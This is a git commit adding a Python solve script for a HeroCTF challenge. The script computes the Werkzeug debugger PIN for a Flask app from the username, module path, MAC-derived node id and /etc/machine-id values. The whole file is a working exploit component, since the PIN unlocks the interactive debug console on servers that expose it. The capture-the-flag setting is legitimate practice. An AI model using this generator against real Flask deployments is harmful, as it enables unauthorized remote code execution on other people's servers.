e0d542d2ba311452632c4d7388ab3b79719606f0
Mark Uche <113513376+markuched13@users.noreply.github.com>
2023-05-15 00:23:51 +0100

    Create genkey.py

---
+++ solvescript/heroctf/System/Flask2/genkey.py
@@ -0,0 +1,47 @@
+import hashlib
+from itertools import chain
+
+probably_public_bits = [
+    'flaskdev',# username
+    'flask.app',# modname
+    'Flask',# getattr(app, '__name__', getattr(app.__class__, '__name__'))
+    '/usr/local/lib/python3.10/dist-packages/flask/app.py' # getattr(mod, '__file__', None),
+]
+
+private_bits = [
+    '2485377892354',# str(uuid.getnode()),  /sys/class/net/eth0/address
+    '68f432c96a6d45f585a019af1ad31fc2',# /etc/machine-id
+    b'0000000000000000',# os.urandom(16)
+]
+
+
+h = hashlib.sha1()
+for bit in chain(probably_public_bits, private_bits):
+    if not bit:
+        continue
+    if isinstance(bit, str):
+        bit = bit.encode("utf-8")
+    h.update(bit)
+h.update(b"cookiesalt")
+
+cookie_name = f"__wzd{h.hexdigest()[:20]}"
+
+num = None
+if num is None:
+    h.update(b"pinsalt")
+    num = f"{int(h.hexdigest(), 16):09d}"[:9]
+
+rv = None
+
+if rv is None:
+    for group_size in 5, 4, 3:
+        if len(num) % group_size == 0:
+            rv = "-".join(
+                num[x : x + group_size].rjust(group_size, "0")
+                for x in range(0, len(num), group_size)
+            )
+            break
+    else:
+        rv = num
+
+print("Key: "+rv)
